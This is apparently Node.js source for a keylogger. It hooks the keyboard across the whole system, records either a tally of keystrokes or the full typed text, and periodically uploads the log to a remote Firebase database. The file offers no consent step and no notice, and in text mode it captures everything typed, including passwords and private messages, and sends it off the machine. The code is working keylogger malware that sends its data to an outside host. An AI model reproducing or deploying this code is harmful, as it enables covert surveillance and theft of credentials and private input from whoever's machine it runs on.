import { GlobalKeyboardListener } from "node-global-key-listener";
import * as fs from "fs";
import { readFile } from "fs/promises";
import { initializeApp } from "firebase/app";
import { getDatabase, set, ref, get, child } from "firebase/database";

const firebaseConfig = JSON.parse(
  await readFile(new URL("./firebaseConfig.json", import.meta.url))
);

const keyLoggerConfig = JSON.parse(
  await readFile(new URL("./keyLoggerConfig.json", import.meta.url))
);

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const globalKbListener = new GlobalKeyboardListener();

let keyPressTally = {};
let keyPressText = "";

let keyPressNamesTally = {
  "": "VOLUME",
  BACKSLASH: "BACKSLASH",
  BACKSPACE: "BACKSPACE",
  "CAPS LOCK": "CAPS_LOCK",
  COMMA: "COMMA",
  DELETE: "DELETE",
  DOT: "DOT",
  END: "END",
  EQUALS: "EQUALS",
  ESCAPE: "ESCAPE",
  "FORWARD SLASH": "FORWARD_SLASH",
  HOME: "HOME",
  INS: "INSERT",
  "LEFT ALT": "LEFT_ALT",
  "LEFT META": "LEFT_META",
  "LEFT SHIFT": "LEFT_SHIFT",
  "NUMPAD DOT": "NUM_DOT",
  NUM_MINUS: "MINUS",
  NUM_PLUS: "PLUS",
  "NUM LOCK": "NUM_LOCK",
  "NUMPAD 1": "NUM_1",
  "NUMPAD 2": "NUM_2",
  "NUMPAD 3": "NUM_3",
  "NUMPAD 4": "NUM_4",
  "NUMPAD 5": "NUM_5",
  "NUMPAD 6": "NUM_6",
  "NUMPAD 7": "NUM_7",
  "NUMPAD 8": "NUM_8",
  "NUMPAD 9": "NUM_9",
  "NUMPAD 0": "NUM_0",
  "NUMPAD DIVIDE": "NUM_DIVIDE",
  "NUMPAD MINUS": "NUM_MINUS",
  "NUMPAD MULTIPLY": "NUM_MULTIPLY",
  "NUMPAD PLUS": "NUM_PLUS",
  "PAGE DOWN": "PAGE_DOWN",
  "PAGE UP": "PAGE_UP",
  "PRINT SCREEN": "PRTSCR",
  QUOTE: "QUOTE",
  RETURN: "RETURN",
  "RIGHT META": "RIGHT_META",
  "RIGHT SHIFT": "RIGHT_SHIFT",
  "SCROLL LOCK": "SCROLL_LOCK",
  SECTION: "SECTION",
  SEMICOLON: "SEMICOLON",
  "SQUARE BRACKET CLOSE": "SQUARE_BRACKET_CLOSE",
  "SQUARE BRACKET OPEN": "SQUARE_BRACKET_OPEN",
  TAB: "TAB",
  "LEFT CTRL": "LEFT_CTRL",
  "RIGHT CTRL": "RIGHT_CTRL",
  "UP ARROW": "UP",
  "LEFT ARROW": "LEFT",
  "DOWN ARROW": "DOWN",
  "RIGHT ARROW": "RIGHT",
};

let keyPressNamesText = {
  "": "<VOL>",
  BACKSLASH: "<BACKSLASH>",
  BACKSPACE: "<BACKSPACE>",
  "CAPS LOCK": "<CAPS_LOCK>",
  COMMA: "<COMMA>",
  DELETE: "<DELETE>",
  DOT: "<DOT>",
  END: "<END>",
  EQUALS: "<EQUALS>",
  ESCAPE: ",ESCAPE>",
  "FORWARD SLASH": "<FORWARD_SLASH>",
  HOME: "<HOME>",
  INS: "<INSERT>",
  "LEFT ALT": "<LEFT_ALT>",
  "LEFT SHIFT": "<LEFT_SHIFT>",
  MINUS: "<MINUS>",
  "NUM LOCK": "<NUM_LOCK>",
  "NUMPAD 1": "<NUM_1>",
  "NUMPAD 2": "<NUM_2>",
  "NUMPAD 3": "<NUM_3>",
  "NUMPAD 4": "<NUM_4>",
  "NUMPAD 5": "<NUM_5>",
  "NUMPAD 6": "<NUM_6>",
  "NUMPAD 7": "<NUM_7>",
  "NUMPAD 8": "<NUM_8>",
  "NUMPAD 9": "<NUM_9>",
  "NUMPAD 0": "<NUM_0>",
  "NUMPAD DIVIDE": "<NUM_DIVIDE>",
  "NUMPAD MINUS": "<NUM_MINUS>",
  "NUMPAD MULTIPLY": "<NUM_MULTIPLY>",
  "NUMPAD PLUS": "<NUM_PLUS>",
  "PAGE DOWN": "<PAGE_DOWN>",
  "PAGE UP": "<PAGE_UP>",
  "PRINT SCREEN": "<PRTSCR>",
  QUOTE: "<QUOTE>",
  RETURN: "<RETURN>",
  "RIGHT SHIFT": "<RIGHT_SHIFT>",
  "SCROLL LOCK": "<SCROLL_LOCK>",
  SECTION: "<SECTION>",
  SEMICOLON: "<SEMICOLON>",
  SPACE: " ",
  "SQUARE BRACKET CLOSE": "<SQUARE_BRACKET_CLOSE>",
  "SQUARE BRACKET OPEN": "<SQUARE_BRACKET_CLOSE>",
  TAB: "<TAB>",
  "LEFT CTRL": "<LEFT_CTRL>",
  "RIGHT CTRL": "<RIGHT_CTRL>",
  "UP ARROW": "<UP>",
  "LEFT ARROW": "<LEFT>",
  "DOWN ARROW": "<DOWN>",
  "RIGHT ARROW": "<RIGHT>",
};

let keyPressCounter = 0;

// Read the previously logged keys and put them in the keyPresses array before starting
if (keyLoggerConfig.mode === "TALLY") {
  get(ref(database, "keyPressTally/")).then((snapshot) => {
    if (snapshot.exists()) {
      keyPressTally = snapshot.val();
    }
  });
} else if (keyLoggerConfig.mode === "TEXT") {
  get(ref(database, "keyPressText/")).then((snapshot) => {
    if (snapshot.exists()) {
      keyPressText = snapshot.val();
    }
  });
}

// Listen for keypresses and process them
globalKbListener.addListener(function (e, down) {
  // We listen for an UP event because if we listen for DOWN,
  // it registers keypresses for as long as the key is pressed instead of only once
  if (e.state === "UP") {
    keyPressCounter++;
    if (keyLoggerConfig.mode === "TALLY") {
      keyPressTally[keyPressNamesTally[e.name] || e.name] ??= 0;
      keyPressTally[keyPressNamesTally[e.name] || e.name]++;
    } else if (keyLoggerConfig.mode === "TEXT") {
      keyPressText += [keyPressNamesText[e.name] || e.name];
    }
    if (keyPressCounter >= keyLoggerConfig.saveInterval) {
      save();
      keyPressCounter = 0;
    }
  }
});

// Save logged keys to file
function save() {
  if (keyLoggerConfig.mode === "TALLY") {
    set(ref(database, "keyPressTally/"), keyPressTally);
  } else if (keyLoggerConfig.mode === "TEXT") {
    set(ref(database, "keyPressText/"), keyPressText);
  }
}
